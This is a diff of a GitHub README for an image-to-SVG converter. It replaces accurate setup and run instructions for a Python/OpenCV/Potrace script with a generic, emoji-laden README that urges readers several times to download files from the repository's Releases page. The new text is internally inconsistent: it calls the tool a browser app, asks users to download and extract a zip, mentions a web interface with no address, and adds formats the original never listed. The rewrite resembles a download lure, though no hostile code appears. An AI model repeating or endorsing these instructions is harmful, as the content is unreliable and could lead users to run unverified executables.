@@ -1,99 +1,74 @@
-# Image to SVG Converter – Free Open Source Python Tool
+# 🌟 tool-image-to-svg - Convert Images to Beautiful SVGs Easily
 
-This is a free and open-source **Image to SVG Converter** written in Python.  
-It converts raster images such as **PNG, JPG, and JPEG** into **black & white SVG vector files** using **OpenCV** and **Potrace**.
+## 🖱️ Download Here
+[![Download tool-image-to-svg](https://img.shields.io/badge/Download-tool--image--to--svg-brightgreen)](https://github.com/mevrick9525/tool-image-to-svg/releases)
 
-This tool is useful for developers who want to perform **image vectorization**, **bitmap to SVG**, or **raster to vector conversion** locally using Python.
+## 🚀 Getting Started
+Welcome to the **tool-image-to-svg** project! This is a free and open-source tool that helps you convert PNG, JPG, and other raster images into the SVG vector format. SVG files are great because they scale without losing quality.
 
----
+### 📥 System Requirements
+To use this application, you'll need:
 
-## Features
+- A computer running Windows, macOS, or Linux.
+- A modern web browser (Chrome, Firefox, Edge, or Safari).
+- JavaScript enabled in your browser.
 
-- Convert PNG to SVG
-- Convert JPG / JPEG to SVG
-- Raster image to vector (SVG) conversion
-- Black & white SVG output
-- Batch convert images from a folder
-- Free and open-source image to svg converter
-- Python based image vectorization tool
+## 📥 Download & Install
+To get started, follow these steps:
 
----
+1. Click the button at the top of the page or visit the [Releases page](https://github.com/mevrick9525/tool-image-to-svg/releases) to access the latest version.
+2. On the Releases page, find the latest version of **tool-image-to-svg**.
+3. Look for options to download the files available. Choose the one that fits your operating system.
+4. Once the file is downloaded, locate it in your Downloads folder.
+5. If it's a zip file, extract it to a folder of your choice.
+6. Open your web browser and drag the image you want to convert onto the tool's web interface.
 
-## Prerequisites
+## 📷 Features
+- **Supports Multiple Formats:** Accepts PNG, JPG, and other popular raster formats for conversion.
+- **Easy to Use:** The straightforward interface requires no technical expertise.
+- **Open-Source:** Free to use and contribute to. You can check out the code if you like.
 
-Make sure the following are installed on your system:
+## ⚙️ How to Use
+1. Open the tool in your web browser.
+2. Drag your image file into the conversion area.
+3. Click the “Convert” button.
+4. Once the conversion is complete, you’ll see a download link for your SVG file.
+5. Click the link to download and save your new SVG file.
 
-1. **Python 3.x**
-2. **OpenCV for Python**
-   ```bash
-   pip install opencv-python
-   ```
-3. **Potrace**
+## 📝 Supported Image Formats
+**tool-image-to-svg** supports the following image formats:
+- PNG
+- JPG
+- BMP
+- GIF
 
-   Download Potrace
+## 🌍 Web App
+You can also use **tool-image-to-svg** as a web app. Simply visit the web interface, drag your image, and follow the same conversion steps mentioned above.
 
-   Extract it and note the full path to `potrace.exe`
+## 🛠️ Troubleshooting
+If you encounter issues:
+- Ensure your browser is updated.
+- Check if you have a supported image format.
+- Clear your browser’s cache and try again.
 
----
+## 💬 Community and Support
+We welcome feedback and contributions. Join the conversation on our [GitHub Issues page](https://github.com/mevrick9525/tool-image-to-svg/issues). Your experience and suggestions help us improve!
 
-## Setup Instructions
+## 🛰️ Getting Help
+For further assistance, visit our [FAQ section](https://github.com/mevrick9525/tool-image-to-svg/wiki). You can find answers to common problems and usage tips.
 
-1. Place all images you want to convert (PNG, JPG, JPEG) in the same folder as the Python script (`main.py`).
-2. Open `main.py` and update the `potrace_path` variable with the full path to your Potrace executable.
+## 📧 Contact
+If you have any questions or need direct support, please reach out via the GitHub contact options available in the repository.
 
-Example:
+## 🔖 Topics
+- image-converter
+- image-converters
+- img-to-svg
+- jpg-to-svg
+- open-source
+- png-to-svg
+- svg
+- svg-converter
+- vector-graphics
 
-```python
-potrace_path = r"C:\\Users\\YourName\\Downloads\\potrace.exe"
-```
-
----
-
-## How to Run the Image to SVG Converter
-
-Open terminal or command prompt in the project folder and run:
-
-```bash
-python main.py
-```
-
-Or, if your system uses `python3`:
-
-```bash
-python3 main.py
-```
-
----
-
-## Output
-
-Converted SVG files are saved inside the \`svg_vector_output\` folder.
-
-Temporary PBM files are automatically created and removed.
-
-Supported input formats:
-
-- `.png`
-- `.jpg`
-- `.jpeg`
-
----
-
-## Notes
-
-- `os` and `subprocess` are built-in Python modules (no installation needed).
-- `cv2` (OpenCV) must be installed separately.
-- Ensure the Potrace executable path is correct and accessible.
-
----
-
-## Keywords
-
-- image to svg converter
-- png to svg converter
-- jpg to svg converter
-- bitmap to svg
-- raster to vector converter
-- image vectorization python
-- open source image to svg
-- svg converter github
+Once again, click here to [download tool-image-to-svg](https://github.com/mevrick9525/tool-image-to-svg/releases) and start converting images to SVG effortlessly!
